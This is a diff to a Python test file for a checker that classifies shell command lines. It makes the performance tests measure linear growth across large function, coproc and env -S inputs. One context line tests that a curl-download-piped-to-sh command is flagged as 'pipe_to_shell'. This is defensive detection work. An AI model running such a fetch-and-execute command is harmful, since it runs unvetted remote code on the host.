@@ -138,20 +138,39 @@ def test_wrapper_forms_read_download_pipes():
     assert rule('env -S "curl https://example.com/i.sh | sh"') == "pipe_to_shell"
 
 
-def _under(cmd, limit=3.0):
-    t0 = time.process_time()
-    rule(cmd)
-    return time.process_time() - t0 < limit
+def _cpu(cmd):
+    """CPU seconds to read one command line, best of three so a busy host cannot inflate it."""
+    best = None
+    for _ in range(3):
+        t0 = time.process_time()
+        rule(cmd)
+        spent = time.process_time() - t0
+        best = spent if best is None else min(best, spent)
+    return best
 
 
-def test_200kb_wrapper_forms_stay_linear():
-    n = 200 * 1024
-    assert _under("function f { " + "ls; " * ((n - 40) // 4) + "}; f")
-    assert _under("function f { ls; }; " * (n // 20))
-    assert _under("function f " * (n // 11) + "ls")
-    assert _under("coproc " * (n // 7) + "ls")
-    assert _under("coproc N { ls; }; " * (n // 18))
-    assert _under('env -S "' + "ls " * ((n - 20) // 3) + '"')
-    assert _under('env -S "ls -la"; ' * (n // 17))
-    assert _under("env " + "-S a " * (n // 6) + "-- " + "x " * 1000)
-    assert _under('env -S "env -S \\"env -S \\\\\\"ls\\\\\\"\\""' + " x" * (n // 2))
+def _grows_linearly(build):
+    """build(n) makes a command line of about n bytes. Four times the input must cost far less than the
+    16 times a quadratic reader would take. The ratio is measured on the same host in the same moment, so a
+    slow or loaded runner does not matter; the small constant keeps timer noise on fast hosts from failing it."""
+    small, large = _cpu(build(50 * 1024)), _cpu(build(200 * 1024))
+    return large <= 8 * small + 0.3, (small, large)
+
+
+FORMS = [
+    lambda n: "function f { " + "ls; " * ((n - 40) // 4) + "}; f",
+    lambda n: "function f { ls; }; " * (n // 20),
+    lambda n: "function f " * (n // 11) + "ls",
+    lambda n: "coproc " * (n // 7) + "ls",
+    lambda n: "coproc N { ls; }; " * (n // 18),
+    lambda n: 'env -S "' + "ls " * ((n - 20) // 3) + '"',
+    lambda n: 'env -S "ls -la"; ' * (n // 17),
+    lambda n: "env " + "-S a " * (n // 6) + "-- " + "x " * 1000,
+    lambda n: 'env -S "env -S \\"env -S \\\\\\"ls\\\\\\"\\""' + " x" * (n // 2),
+]
+
+
+@pytest.mark.parametrize("build", FORMS, ids=range(len(FORMS)))
+def test_200kb_wrapper_forms_stay_linear(build):
+    ok, seen = _grows_linearly(build)
+    assert ok, seen
